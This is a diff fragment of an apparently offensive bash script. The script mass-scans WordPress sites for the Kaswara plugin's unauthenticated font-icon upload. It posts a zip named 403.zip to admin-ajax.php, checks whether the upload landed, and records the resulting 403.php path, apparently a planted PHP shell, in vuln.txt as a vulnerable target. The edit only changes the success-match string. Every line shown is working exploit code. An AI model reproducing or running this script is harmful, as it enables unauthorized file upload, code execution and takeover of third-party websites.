@@ -24,7 +24,7 @@ green='\e[42m'
 target=$1
 thread=$2
 
-if [[ $(curl -s -F "fonticonzipfile=@403.zip" -F "fontsetname=exs" -F "action=uploadFontIcon" --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php?action=uploadFontIcon') =~ 'stylesheet' ]]; 
+if [[ $(curl -s -F "fonticonzipfile=@403.zip" -F "fontsetname=exs" -F "action=uploadFontIcon" --connect-timeout 10 --max-time 10 --insecure $target'/wp-admin/admin-ajax.php?action=uploadFontIcon') =~ '/wp-content/uploads/kaswara/fonts_icon/exs/' ]]; 
 then
     printf "${green}[ Vuln ]${classic} => [$target/wp-content/uploads/kaswara/fonts_icon/exs/403.php] \n";
     echo "$target/wp-content/uploads/kaswara/fonts_icon/exs/403.php" >> vuln.txt
